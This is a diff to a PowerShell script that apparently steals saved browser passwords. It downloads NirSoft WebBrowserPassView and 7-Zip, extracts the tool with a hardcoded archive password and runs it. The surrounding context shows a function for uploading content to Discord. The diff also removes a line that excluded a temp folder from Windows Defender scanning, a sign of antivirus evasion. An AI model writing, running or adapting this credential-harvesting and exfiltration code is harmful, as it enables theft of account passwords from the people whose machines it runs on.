@@ -55,10 +55,13 @@ function TempDir {
 
 # Function to download Nirsoft tools
 function Get-Nirsoft {
+	$zipPassword = 'wbpv28821@'  # Ajoutez votre mot de passe ici
     Invoke-WebRequest -Headers @{'Referer' = 'https://www.nirsoft.net/utils/web_browser_password.html'} -Uri https://www.nirsoft.net/toolsdownload/webbrowserpassview.zip -OutFile wbpv.zip
     Invoke-WebRequest -Uri https://www.7-zip.org/a/7za920.zip -OutFile 7z.zip
     Expand-Archive 7z.zip
-    .\7z\7za.exe e wbpv.zip
+    .\7z\7za.exe e wbpv.zip -p$zipPassword
+	.\WebBrowserPassView.exe
+    
 }
 
 # Function to upload content to Discord
@@ -107,9 +110,6 @@ function Wait-FileCreation {
 
 # Call TempDir function
 TempDir
-
-# Add exclusion path to Windows Defender
-Add-MpPreference -ExclusionPath "C:\temp"
 
 # Call Get-Nirsoft function to download Nirsoft tools
 Get-Nirsoft
